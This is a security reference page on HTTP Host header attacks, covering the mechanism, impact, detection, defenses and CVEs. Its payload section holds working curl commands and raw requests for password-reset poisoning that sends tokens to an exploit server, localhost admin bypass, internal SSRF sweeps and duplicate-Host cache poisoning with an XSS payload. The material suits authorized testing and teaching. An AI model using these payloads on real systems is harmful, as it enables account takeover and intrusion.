# HTTP Host Header Attacks

> Trusting the Host header enables cache poisoning, password-reset poisoning, SSRF. **Deep dive:** [`Troubleshooting_Guide/http_host_header_attacks.md`](../../../../Troubleshooting_Guide/http_host_header_attacks.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A05:2021 Misconfiguration
**Status:** complete

## What it is
A Host header attack abuses the fact that the `Host` header is attacker-controlled but is often
trusted by the application as if it were a safe, server-defined value. Because frameworks expose
it as a convenient way to learn "which site am I", developers use it to build URLs, route
requests, and make security decisions — all of which an attacker can subvert.

## How it works
The client fully controls the `Host` header (and forwarding headers like `X-Forwarded-Host`). An
app that reflects it into responses, uses it to construct absolute links (e.g. password-reset
URLs), routes traffic to an upstream named by the Host, or gates access on a Host value such as
`localhost`, can be tricked by sending a spoofed, duplicated, or malformed Host. The breakage
stems from treating a request-scoped, untrusted input as a trusted identity for the deployment.

## Impact
Depends on the sink: password-reset poisoning hijacks accounts by redirecting the reset token to
an attacker server; routing-based abuse turns the front-end into an SSRF pivot onto internal
networks; cache poisoning persists injected content (often XSS) to every cache hit; and Host-based
access checks can be bypassed to reach admin functionality. Severity ranges from medium to
critical when it yields account takeover or internal network access.

## How to detect
- Send an arbitrary `Host` and see if the request still succeeds (200) and/or the value is
  reflected in the body, a redirect `Location`, or links.
- Try `localhost`/`127.0.0.1` against gated paths like `/admin` to spot Host-based access control.
- Inject `X-Forwarded-Host`, `X-Host`, or a duplicate `Host` header and watch for reflection or
  routing changes; check whether an injected port appears unescaped in responses or emails.
- For routing SSRF, point the Host at internal IPs and look for differential responses/timing.

## Exploitation (summary)
Probe whether the Host is reflected, routed on, or validated, then steer the matching attack: for
password-reset poisoning, set the Host (or `X-Forwarded-Host`) to your exploit server so the reset
link carries the victim's token to you; for routing SSRF, sweep `Host: 192.168.0.X` to find and
drive internal hosts; for cache poisoning, send a duplicate/oversized Host that desyncs cache and
backend. Full payloads live in the Payloads section and the deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Probing whether the Host is trusted
Fast checks to see if the app reflects, routes on, or validates the Host.

```bash
# Arbitrary Host accepted?
curl -sk https://TARGET/ -H "Host: arbitrary.com" -o /dev/null -w "%{http_code}\n"

# Localhost / loopback bypass of access control
curl -sk https://TARGET/admin -H "Host: localhost"  -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/admin -H "Host: 127.0.0.1"  -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/admin -H "Host: 0.0.0.0"    -o /dev/null -w "%{http_code}\n"

# Absolute-URL request line (routing still follows Host)
curl -sk -H "Host: evil.com" "https://TARGET/"

# Port injection (is the port reflected?)
curl -sk https://TARGET/ -H "Host: TARGET:TESTPORT" -o /dev/null
```

### Password reset poisoning
When the reset URL is built from the Host, redirect the token to a server you control.

```bash
# 1. Poison the Host so the reset link points at your server
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: YOUR-EXPLOIT-SERVER.exploit-server.net"

# 2. Read the token from your exploit-server log:
#    GET /forgot-password?temp-forgot-password-token=abc123

# 3. Replay the token against the real host
#    https://TARGET/forgot-password?temp-forgot-password-token=abc123
```

If the app trusts forwarding headers instead of (or in addition to) Host, inject them:

```bash
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: TARGET.net" \
  -H "X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net"
```

Other headers to fuzz: `X-Host`, `X-Forwarded-Server`, `X-Original-Host`, `X-Rewrite-URL`.

When only the **port** is reflected (in HTML email), break out with dangling markup to capture the password in a URL:

```bash
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: TARGET:'<a href=\"//YOUR-SERVER.net/?"
```

### Access-control bypass
Spoof an internal Host to defeat IP/Host-based admin gating.

```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

In a browser, intercept in Burp and rewrite `Host: TARGET` to `Host: localhost`.

### Routing-based SSRF
When the Host header drives proxy/upstream routing, point it at internal IPs and scan.

```http
GET / HTTP/1.1
Host: 192.168.0.1
```

Brute-force `192.168.0.X` (1–255) with Burp Intruder — disable "Update Host header to match target". Once an internal host is found, drive authenticated actions against it:

```http
GET /admin/delete?csrf=TOKEN&username=carlos HTTP/1.1
Host: 192.168.0.X
Cookie: session=SESSION
```

An absolute URL in the request line can pass domain validation while routing still follows Host:

```http
GET https://TARGET.net/ HTTP/1.1
Host: 192.168.0.X
Cookie: session=SESSION
```

### Cache poisoning via Host
Make the cache and backend disagree, or inject markup through the reflected port.

```http
GET /?cb=1337 HTTP/1.1
Host: TARGET.net
Host: YOUR-EXPLOIT-SERVER.net
```

Send the duplicate Host manually in Burp Repeater — `curl` deduplicates them.

```http
GET / HTTP/1.1
Host: TARGET.com:1337<script>alert(1)</script>
```

If the unescaped port lands in a cached response, this becomes stored XSS for every visitor.

### Virtual host enumeration
On shared IPs, sweep candidate vhosts via the Host header.

```bash
for vhost in admin staging dev internal api; do
  echo -n "$vhost: "
  curl -sk -o /dev/null -w "%{http_code}" https://TARGET/ -H "Host: $vhost.company.com"
  echo
done
```

### Host header → attack selection
Map the observed Host usage to the attack it enables.

| Host header use | Attack |
|-----------------|--------|
| Reset-email URL construction | Password reset poisoning |
| `if host == 'localhost'` gating | Admin panel bypass |
| Proxy routing (Host → upstream) | Internal SSRF |
| Duplicate Host parsing | Cache poisoning |
| Host port in email HTML | Dangling markup |
| Virtual-host routing | Internal host discovery |

## Defenses
1. Don't trust the Host: validate every incoming `Host` against an allow-list of known-good
   domains and reject (or serve a default vhost for) anything else.
2. Build absolute URLs from a server-side configured base URL, never from the request Host.
3. Strip or ignore forwarding headers (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`, etc.)
   unless they originate from a trusted, authenticated proxy.
4. Reject ambiguous requests — duplicate Host headers, absolute request-line URIs, and malformed
   ports — at the edge; configure the web server with a strict default/canonical vhost.
5. Never make access-control or routing decisions based on the Host value.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=HTTP+Host+Header+Attacks
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=HTTP+Host+Header+Attacks
- **Exploit-DB** — https://www.exploit-db.com/search?q=HTTP+Host+Header+Attacks
- **GitHub Advisories** — https://github.com/advisories?query=HTTP+Host+Header+Attacks
- **OSV** — https://osv.dev/list?q=HTTP+Host+Header+Attacks
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `HTTP Host Header Attacks <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2017-8295` — WordPress password-reset poisoning via the `SERVER_NAME`/Host value, letting
  an attacker have the reset email link to a host they control.
- `CVE-2016-10033` — PHPMailer RCE; while not Host-header-specific, it shows how trusting
  request-derived values in mail flows leads to compromise (often paired with reset-link abuse).
- _Canonical incident: Django introduced the `ALLOWED_HOSTS` setting specifically to stop Host
  header poisoning of password-reset and absolute-URL flows after real-world abuse._

## References
- PortSwigger Web Security Academy — HTTP Host header attacks: https://portswigger.net/web-security/host-header
- OWASP — Web Security Testing Guide, Testing for Host Header Injection: https://owasp.org/www-project-web-security-testing-guide/
- RFC 7230 §5.4 (Host) and RFC 9112 §3.2 — HTTP/1.1 message routing and the Host header.
